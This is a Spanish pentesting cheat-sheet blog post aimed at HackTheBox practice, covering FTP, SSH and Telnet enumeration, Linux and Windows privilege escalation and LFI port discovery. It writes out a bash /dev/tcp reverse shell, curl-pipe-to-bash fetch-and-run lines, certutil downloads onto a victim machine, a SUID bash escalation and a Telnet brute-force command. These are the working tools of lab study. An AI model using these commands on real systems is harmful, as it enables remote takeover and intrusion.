---
layout: single
title: Notas de Pentesting
excerpt: "En esta ocasión, voy a mostrar unas cosillas que nos pueden ser útiles para nuestras pruebas de penetración. Puedes probarlas cuando estés en HackTheBox o no se, incluso, en Active Directory."
date: 2023-05-21
classes: wide
header:
  teaser: /assets/images/pentestingNotes/notasHacker.webp
  teaser_home_page: true
  icon: /assets/images/notas.png
categories:
  - Pentesting Notes
  - Learning
tags:
  - Linux
  - Windows
  - Shell
  - Reverse Shell
  - Exploits
  - Escalada de Privilegios
---
![](/assets/images/pentestingNotes/notasHacker.webp)

En esta ocasión, voy a mostrar unas cosillas que nos pueden ser útiles para nuestras pruebas de penetración. Puedes probarlas cuando estés en HackTheBox o no se, incluso, en Active Directory.

**ACTUALIZADO**: 21/05/2023

**PENDIENTE ACTUALIZACIÓN**


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Servicios">Puertos y Servicios</a></li>
			<ul>
				<li><a href="#FTP">Puerto 21 - Servicio FTP</a></li>
				<ul>
					<li><a href="#FTP1">Entrar en el Servicio</a></li>
					<li><a href="#FTP2">Comandos Útiles</a></li>
					<li><a href="#FTP3">Datos de Interés</a></li>
					<ul>
                                        	<li><a href="#FTP3a">Archivos de configuración FTP</a></li>
                                        	<li><a href="#FTP3b">Banner Grabing</a></li>
						<li><a href="#FTP3c">Descargar todos los archivos del FTP</a></li>
                                	</ul>
					<li><a href="#FTP4">Post Explotación</a></li>
				</ul>
				<li><a href="#SSH">Puerto 22 - Servicio SSH</a></li>
				<ul>
                                        <li><a href="#SSH1">Entrar al Servicio</a></li>
                                        <li><a href="#SSH2">Comandos Útiles</a></li>
					<li><a href="#SSH3">Descargar/Ejecutar Archivos en Servicio SSH/Linux</a></li>
					<ul> 
                                        	<li><a href="#SSH3a">Descargando Archivo</a></li>
                                        	<li><a href="#SSH3b">Ejecutando un Archivo con curl</a></li>
                                	</ul>
					<li><a href="#SSH4">Exploits/Herramientas Útiles</a></li>
					<ul> 
                                                <li><a href="#SSH4a">Enumeración de Usuarios SSH</a></li>
                                                <li><a href="#SSH4b">Herramienta linpeas.sh</a></li>
                                        </ul>
                                </ul>
				<li><a href="#Telnet">Puerto 23 - Servicio Telnet</a></li>
				<ul> 
                                        <li><a href="#Telnet1">Entrar al Servicio</a></li>
                                        <li><a href="#Telnet2">Datos de Interés</a></li>
					<ul> 
                                        	<li><a href="#Telnet2a">Archivos de configuración Telnet</a></li>
                                        	<li><a href="#Telnet2b">Banner Grabing</a></li>
						<li><a href="#Telnet2c">Enumeración de Servicio Telnet con NMAP</a></li>
                                	</ul>
                                </ul>
				<li><a href="#SMTP">Puerto 25 - Servicio SMTP</a></li>
				<ul> 
                                        <li><a href="#"></a></li>
                                        <li><a href="#"></a></li>
                                </ul>
				<li><a href="#Samba">Puerto 139 - Servicio Samba</a></li>
				<ul> 
                                        <li><a href="#"></a></li>
                                        <li><a href="#"></a></li>
                                </ul>
				<li><a href="#SMB">Puerto 445 - Servicio SMB</a></li>
				<ul> 
                                        <li><a href="#"></a></li>
                                        <li><a href="#"></a></li>
                                </ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Linux">Linux</a></li>
			<ul>
				<li><a href="#Shell">Shell Interactiva de Bash</a></li>
				<li><a href="#Bash">Conectarse Remotamente con Bash</a></li>
				<li><a href="#Descarga">Descargando una Archivo en Máquina Victima con Linux</a></li>
				<li><a href="#Escalar">Escalar Privilegios con Chmod</a></li>
				<li><a href="#Escalar2">Escalar Privilegios con Binarios SUID</a></li>
			</ul>
		<li><a href="#Windows">Windows</a></li>
			<ul>
				<li><a href="#Certutil">Descargar Archivos con Certutil Windows</a></li>
				<li><a href="#Privilegio">Abusar del Privilegio SeImpersonatePrivilege Windows</a></li>
				<li><a href="#Suggester">Herramienta Windows Suggester</a></li>
			</ul>
		<li><a href="#Reverse">Reverse Shells</a></li>
			<ul>
				<li><a href="#Reverse">Reverse Shell de PHP</a></li>
			</ul>
		<li><a href="#Web">Tips para Pentesting Web</a></li>
			<ul>
                                <li><a href="#CURL">Enumerando Puertos Internos con CURL</a></li>
                        </ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Servicios" style="text-align:center;">Puertos y Servicios</h1>
</div>
<br>


<h2 id="FTP">Puerto 21 - Servicio FTP</h2>

El Protocolo de transferencia de archivos (FTP), es un protocolo de red estándar utilizado para la transferencia de archivos informáticos entre un cliente y un servidor en una red informática.

Es un protocolo de texto sin formato que utiliza como carácter de nueva línea 0x0d 0x0a, por lo que a veces es necesario conectarse mediante **Telnet** o **nc -C**

Este se encuentra en el **Puerto 21 por TCP**.

<br>

<h3 id="FTP1">Entrar en el Servicio</h3>

Para entrar:
```bash
ftp IP_De_La_Máquina
```

En caso de tener acceso como usuario **Anonymous**
```bash
ftp IP_De_La_Máquina
user: anonymous
passwd: anonymous / presiona enter
```

<br>

<h3 id="FTP2">Comandos Útiles</h3>

* **help** 		Para saber los comandos que puedes usar, no siempre puedes usar todos.
* **ls, dir** 		Ver archivos y ver todos los archivos.
* **cd** 		Moverse entre directorios
* **pwd** 		Muestra donde te encuentras.
* **mkdir** 		Para crear un directorio.
* **rmdir** 		Para eliminar un directorio
* **get, mget** 	Copia un archivo (o varios archivos) del directorio de trabajo remoto al directorio de trabajo local.
* **put, mput** 	Copia un archivo (o varios archivos) del directorio de trabajo local al directorio de trabajo remoto.
* **delete, mdelete** 	Elimina un archivo (o varios archivos) del directorio de trabajo remoto.
* **exit, bye**		Para salir del servicio.
* **binary**		Para entrar en modo binario y poder descargar ejecutables, comprimidos, imagenes, ficheros de sonido, etc.
* **ascii** 		Para entrar en modo ASCII y poder descargar ficheros o documentos, es el modo por defecto que tiene FTP.

Aquí puedes encontrar más información:
* https://docs.oracle.com/cd/E24842_01/html/E22524/remotehowtoaccess-14.html
* https://www.uv.es/bombinp/ftp.html

<br>

<h3 id="FTP3">Datos de Interés</h3>

<br>

<h4 id="FTP3a">Archivos de configuración FTP</h4>

* ftpusers
* ftp.conf
* proftpd.conf
* vsftpd.conf

<br>

<h4 id="FTP3b">Banner Grabing</h4>

Técnica utilizada para obtener información sobre un sistema informático en una red y los servicios que se ejecutan en sus puertos abiertos.
```bash
nc -vn <IP> 21
openssl s_client -connect dominio_O_IP:21 -starttls ftp #Obtiene el certificado si es que existe.
```

<br>

<h4 id="FTP3c">Descargar todos los archivos del FTP</h4>

De esta forma, podemos descargar todos los archivos del servicio FTP, pero esto puede tardar demasiado y la descargar puede resultar dañada. Por lo que es mejor entrar y analizar:
```bash
wget -m ftp://anonymous:anonymous@IP	 #Descarga todos los archivos
wget -m --no-passive ftp://anonymous:anonymous@IP 	#Descarga todos los archivos
```

<br>

<h3 id="FTP4">Post Explotación</h3>

La configuración predeterminada de **vsFTPd** se puede encontrar en **/etc/vsftpd.conf**. Aquí, puedes encontrar algunas configuraciones peligrosas:

* anonymous_enable=YES
* anon_upload_enable=YES
* anon_mkdir_write_enable=YES
* anon_root=/home/username/ftp - Directorio para anonymous.
* chown_uploads=YES - Cambia la propiedad de los archivos subidos de forma anónima (anonymous).
* chown_username=username - Usuario a quien se otorga la propiedad de los archivos subidos de forma anónima (anonymous).
* local_enable=YES - Permite que los usuarios locales inicien sesión
* no_anon_password=YES - No pide contraseña al usuario anonimo (anonymous).
* write_enable=YES - Permite los comandos: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, y SITE.

Aquí puedes encontrar más información sobre como explotar el servicio FTP:
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp

<h2 id="SSH">Puerto 22 - Servicio SSH</h2>

SSH, Secure Shell o Secure Socket Shell, es un protocolo de red que brinda a los usuarios una forma segura de acceder a una computadora a través de una red no segura.

Este se encuentra en el **Puerto 22 por TCP**.

<br>

<h3 id="SSH1">Entrar al Servicio</h3>

Para entrar al serivicio, necesitamos un usuario y una IP:
```bash
ssh Usuario@IP
```

Si tienes una llave privada, puedes entrar al servicio, usando ese archivo de la llave privada:
```bash
ssh -i id_rsa Usuari@IP
```
Normalmente, estas llaves se encuentran en un directorio oculto llamado **.ssh** y con el nombre **id_rsa**.

<br>

<h3 id="SSH2">Comandos Útiles</h3>

Aquí se utilizan los mismos comandos que se usan en un sistema Linux, por lo que poner que comandos sirven es inútil.

<br>

<h3 id="SSH3">Descargar/Ejecutar Archivos en Servicio SSH/Linux</h3>

Hay varias formas en las que podemos descargar o usar un servicio SSH o en Linux, para hacerlo, deberías abrir un servidor en Python: 
```bash
python3 -m http.server   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<br>

<h4 id="SSH3a">Descargando Archivo</h4>

* Ahora descargamos el archivo, como ejemplo usaremos la Reverse Shell de PHP:
```bash
wget Tu_IP:8000/php-reverse-shell.php
```

<br>

<h4 id="SSH3b">Ejecutando un Archivo con curl</h4>

* Si queremos ejecutar un archivo como **linpeas.sh**, aquí usamos el puerto 80 del servidor de Python, puedes especificar el puerto o no:
```bash
curl Tu_IP:80/linpeas.sh | sh
```

* También con **curl** puedes ejecutar un archivo Bash, esto puede servir para obtener una shell:
```bash
curl Tu_IP/arhcivo | bash
```

<br>

<h3 id="SSH4">Exploits/Herramientas Útiles</h3>

Te dejo estos links con información útil para explotar el servicio SSH:
* https://exploit-notes.hdks.org/exploit/network/protocol/ssh-pentesting/
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh

<br>

<h4 id="SSH4a">Enumeración de Usuarios SSH</h4>

Existe un Exploit que nos sirve para enumerar usuarios, este unicamente sirve para versiones **OpenSSH < 7.7**, ósea versiones menores a 7.7.

Este Exploit es el: **OpenSSH < 7.7 - User Enumeration (2)** que tiene el ID: **CVE-2018-15473**.
```bash
searchsploit ssh enum
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                            | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                      | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                                | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)                                                                | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                               | linux/remote/40113.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Para usar este Exploit, necesitas Python2.

<br>

<h4 id="SSH4b">Herramienta linpeas.sh</h4>

Esta herramienta sirve para ver las vulnerabilidades que tiene el servicio SSH que usa la máquina o incluso el sistema Linux. Es parte del kit de herramientas **PEASS-ng**, estas son herramientas que pueden mostrar vulnerabilidades en una máquina.

Puedes descargarla desde aquí:
* https://github.com/carlospolop/PEASS-ng/releases/tag/20230409

Y aquí te muestra como usarla:
* https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

<h2 id="Telnet">Puerto 23 - Servicio Telnet</h2>

Telnet es un protocolo de red que brinda a los usuarios una forma NO segura de acceder a una computadora a través de una red.

Este se encuentra en el **Puerto 23 por TCP**.

<br>

<h3 id="Telnet1">Entrar al Servicio</h3>

Para entrar al servicio, necesitamos una IP, especificar el **puerto 23** y una contraseña:
```bahs
telnet IP 23
```

Ejemplo:
```bash
telnet 10.10.11.107 23                                       
Trying 10.10.11.107...
Connected to 10.10.11.107.

HP JetDirect

Password:
```

<br>

<h3 id="Telnet2">Datos de Interés</h3>

A veces, este servicio estara configurado para correr ciertos comandos, en la **máquina Antique**, el servicio Telnet, estaba configurado para ejecutar cualquier comando, de esta forma pudimos loguearnos de manera remota, así que debes analizar bien si es el caso cuando te encuentres con uno:
```bash
telnet 10.10.11.107 23                                       
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet sessio
```
Como puedes ver, ahi dice que con **exec** puedes ejecutar cualquier comando.

<br>

<h4 id="Telnet2a">Archivos de configuración Telnet</h4>
* /etc/inetd.conf
* /etc/xinetd.d/telnet
* /etc/xinetd.d/stelnet

<br>

<h4 id="Telnet2b">Banner Grabing</h4>
Técnica utilizada para obtener información sobre un sistema informático en una red y los servicios que se ejecutan en sus puertos abiertos.
```bash
nc -vn <IP> 23
```

<br>

<h4 id="Telnet2c">Enumeración de Servicio Telnet con NMAP</h4>

Para hacer un escaneo que muestre información sobre telnet, usamos la siguiente linea de comando:
```bash
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 <IP>
```

El script **telnet-ntlm-info.nse** obtendrá información de NTLM (versiones de Windows). También podemos especificarlo por **NMAP**:
```bash
nmap --script telnet-ntlm-info -p 23 <target-ip>
```

Y si queremos aplicar fuerza bruta con **NMAP**:
```bash
nmap --script telnet-brute --script-args userdb=users.txt,passdb=passwords.txt,telnet-brute.timeout=8s -p 23 <target-ip>
```

Aquí te dejo más información:
* https://exploit-notes.hdks.org/exploit/network/protocol/telnet-pentesting/

<h2 id="SMTP">Puerto 25 - Servicio SMTP</h2>

<h3 id=""></h3>

<h3 id=""></h3>

<h3 id=""></h3>

<h2 id="Samba">Puerto 139 - Servicio Samba</h2>

<h3 id=""></h3>

<h3 id=""></h3>

<h3 id=""></h3>

<h2 id="SMB">Puerto 445 - Servicio SMB</h2>

<h3 id=""></h3>

<h3 id=""></h3>

<h3 id=""></h3>


<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Linux" style="text-align:center;">Linux</h1>
</div>
<br>


<h2 id="Shell">Shell Interactiva de Bash</h2>

Obtuviste acceso a una máquina, pero ¿quieres tener una terminal más interactiva de bash? Has lo siguiente:
* Escribe el siguiente comando:
```bash
script /dev/null -c bash
```

* Presiona las teclas **ctrl + z**, debería aparecer el siguiente mensaje y luego la terminal de tu máquina:
```bash
zsh: suspended  nc -nvlp 443
```

* Ahora escribe el siguiente comando en tu máquina:
```bash
 stty raw -echo; fg       
[1]  + continued  nc -nvlp 443
```

* Escribe **reset** y te preguntará que tipo de terminal quieres, pon **xterm**:
```bash
[1]  + continued  nc -nvlp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```

* Exportemos **xterm**, **bash** y cambiemos el tamaño de la terminal (este último es opcional, pero lo recomiendo):
```bash
www-data@bashed:/var/www/html/dev$ export TERM=xterm
www-data@bashed:/var/www/html/dev$ export SHELL=bash
www-data@bashed:/var/www/html/dev$ stty rows 51 columns 189
```
Y listo, ya tenemos nuestra terminal interactiva.

<h2 id="Shell1">Shell Interactiva con Python</h2>

Esta opción la usamos cuando la forma de Bash no funciona, esta falla cuando sale el siguiente error:
```bash
lp@antique:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
This account is currently not available.
Script done, file is /dev/null
```

Ahora, para obtener la shell interactiva, hacemos lo siguiente:
* Comprueba que versión de Python usa la máquina:
```bash
lp@antique:~$ which python
which python
lp@antique:~$ which python3
which python3
/usr/bin/python3
```

* Utiliza Python3 para crear una shell de bash:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

* Presiona **ctrl + z** y rápidamente escribe **stty raw -echo; fg**:
```bash
lp@antique:~$ ^Z
zsh: suspended  nc -nvlp 443
stty raw -echo; fg
```

* Ahora escribe **reset xterm**:
```bash
stty raw -echo; fg
[1]  + continued  nc -nvlp 443
                            reset xterm
```

* Por último, exporta la TERM, SHELL y cambia el tamaño de la stty:
```bash
lp@antique:~$ export TERM=xterm
lp@antique:~$ export SHELL=bash
lp@antique:~$ stty rows 51 columns 189
```
Listo, ya tienes tu shell interactiva.

<h2 id="Bash">Conectarse Remotamente con Bash</h2>

Esta es una forma simple de conectarse remotamente en una máquina que usa Linux.

* Vamos a usar el siguiente script:
```bash
bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"
```

* Si lo necesitas para una página web, debes **url encodearlo** cambiando los ampersands por **%26**.
```bash
bash -c "bash -i >%26 /dev/tcp/Tu_IP/443 0>%261"
```

<h2 id="Escalar">Escalar Privilegios con Chmod</h2>

¿Quieres escalar privilegios de forma sencilla? Usa **chmod** para hacerlo, aquí un par de ejemplos:
* Si tienes privilegios como SUDO para **chmod**, solamente escribe el siguiente comando:
```bash
chmod u+s /bin/bash
```

* Si lo necesitas para un script en Python, solo escribe:
```bash
os import
chmod u+s /bin/bash
```

* Ahora, escala privilegios con bash:
```bash
ejemplo@test:$ bash -p
bash-4.3# whoami
root
```

<h2 id="Escalar2">Escalar Privilegios con Binarios SUID</h2>

Este blog, en inglés, explica algunas formas en las que puedes escalar privilegios, recomiendo que lo veas:
* https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/


<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Windows" style="text-align:center;">Windows</h1>
</div>
<br>


<h2 id="Certutil">Descargar Archivos con Certutil Windows</h2>

¿Necesitas descargar archivos en una máquina víctima que usa Windows? Has lo siguiente:

* En tu máquina, abre un servidor en Python en donde tengas el archivo que quieras cargar:
```bash
python3 -m http.server                                                                     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* Ve al directorio **/Temp** de la máquina Windows y crea una carpeta que se llame **/privesc**:
```shell
c:\>cd Windows/Temp
cd Windows/Temp
c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Directory of c:\Windows\Temp
c:\Windows\Temp>mkdir Privesc
mkdir Privesc
c:\Windows\Temp>cd Privesc
cd Privesc
```

* Ahora dentro de **/Privesc** vamos a cargar el archivo que deseas con **Certutil**:
```shell
c:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://Tu_IP:8000/Archivo_que_quieres_cargar Nuevo_Nombre
```

Ejemplo:
```shell
c:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://IP_Mia_xd:8000/MS10-059.exe MS10-059.exe
```

<h2 id="Privilegio">Abusar del Privilegio SeImpersonatePrivilege Windows</h2>

Si bien, hay Exploits para casi todo, podemos usar una herramienta para cuando te topes con este privilegio en una máquina Windows.

Usaremos **Juicy Potato**, aquí un link de como usarlo:
* https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/

Si necesitas **Juicy Potato** para versiones viejas de Windows, aquí te pongo esta versión del **Juicy** llamada **Churrasco**:
* https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/

<h2 id="Suggester">Herramienta Windows Suggester</h2>

Esta herramienta nos sirve para ver a que Exploits es vulnerable la máquina Windows, para esto, necesitamos saber unas cosillas:
* Primero necesitamos descargarla: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

* Una vez descargada, seguimos las instrucciones del GitHub para generar una base de datos en archivo **.xls**:
```bash
python2 windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2023-03-30-mssb.xls
[*] done
```

* Dentro de la máquina víctima, necesitamos la información del sistema:
```bash
systeminfo
```

* Guarda todo lo del **systeminfo** en un archivo **.txt**:
```bash
nano sysinfo.txt
```

* Ahora usa la herramienta, usando el archivo **.txt** y el archivo **.xls**:
```bash
python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
...
```

* Si no funciona la herramienta, has lo siguiente:
```bash
pip2 install xlrd==1.2.0
```

<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Reverse" style="text-align:center;">Reverse Shells</h1>
</div>
<br>

<h2 id="Reverse">Reverse Shell de PHP</h2>

¿Necesitas una **Reverse Shell** que sea hecha en PHP? Aquí tienes una:
* https://github.com/pentestmonkey/php-reverse-shell

* Así puedes clonarla:
```bash
git clone https://github.com/pentestmonkey/php-reverse-shell.git
Clonando en 'php-reverse-shell'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
Recibiendo objetos: 100% (10/10), 9.81 KiB | 1.23 MiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
```
* Recuerda que debes abrir el archivo y modificarlo para poner tu IP y un puerto que quieras.


<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Web" style="text-align:center;">Tips para Pentesting Web</h1>
</div>
<br>


<h2 id="CURL">Enumerando Puertos Internos con CURL</h2>

Digamos que tienes la forma de visualizar archivos internos de una máquina desde una aplicación web o página web, gracias a la inyección de comandos por LFI. Si puedes visualizar el archivo **tcp** del directorio **/proc/net**, puedes descubrir que puertos internos estan abiertos utilizando la herramienta **CURL**.

Para hacerlo, obtengamos una petición por el metodo GET con el parámetro **-X**. Como prueba, usaremos la **máquina Tabby**:
```bash
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../../../proc/net/tcp"
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000   997        0 24968 1 0000000000000000 100 0 0 10 0                     
   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 22923 1 0000000000000000 100 0 0 10 0                     
   2: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 21938 1 0000000000000000 100 0 0 10 0                     
   3: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 22903 1 0000000000000000 100 0 0 10 0                     
   4: C20A0A0A:0050 040E0A0A:B7D2 01 00000000:00000000 02:000AFC7F 00000000    33        0 32297 2 0000000000000000 166 4 30 10 21                   
   5: C20A0A0A:86BA 01010101:0035 02 00000001:00000000 01:000002E0 00000003   101        0 36768 2 0000000000000000 800 0 0 1 7
```

Vamos a usar solamente la columna del **local_address**, si la quieres seleccionar, presiona **ctrl + alt** y selecciona solo los resultados de esa columna (esto funciona en Kali, no se si funciona en otros SO) y reproduce el resultado con **echo**:
```bash
echo "00000000:1F90                                                               
00000000:0050        
3500007F:0035        
00000000:0016        
C20A0A0A:0050        
C20A0A0A:86BA"
00000000:1F90        
00000000:0050        
3500007F:0035        
00000000:0016        
C20A0A0A:0050        
C20A0A0A:86BA
```

Vamos a quedarnos solo con los números que estan después de los ":", usaremos **awk** para obtener ese resultado y con **sort** vamos a ordenarlos:
```bash
echo "00000000:1F90        
00000000:0050        
3500007F:0035        
00000000:0016        
C20A0A0A:0050        
C20A0A0A:86BA" | awk '{print $2}' FS=":" | sort -u
0016        
0035        
0050        
1F90        
86BA
```

Resulta que estos números que obtuvimos, son hexadecimales y estan en little endian, por lo que si usamos una terminal de Python y los ponemos en su formato correspondiente, obtenedremos el número de un puerto:
```bash
python3                                                             
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x0016
22
>>> 0x0035
53
>>> 0x0050
80
>>> 0x1F90
8080
>>> 0x86BA
34490
>>> exit()
```
Y listo, ya enumeraste puertos internos de una máquina.


<br>
<br>
<div style="position: relative;">
	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>

* https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
* https://docs.oracle.com/cd/E24842_01/html/E22524/remotehowtoaccess-14.html
* https://www.uv.es/bombinp/ftp.html
* https://github.com/carlospolop/PEASS-ng/releases/tag/20230409
* https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
* https://exploit-notes.hdks.org/exploit/network/protocol/telnet-pentesting/
* https://github.com/pentestmonkey/php-reverse-shell
* https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
* https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/
* https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
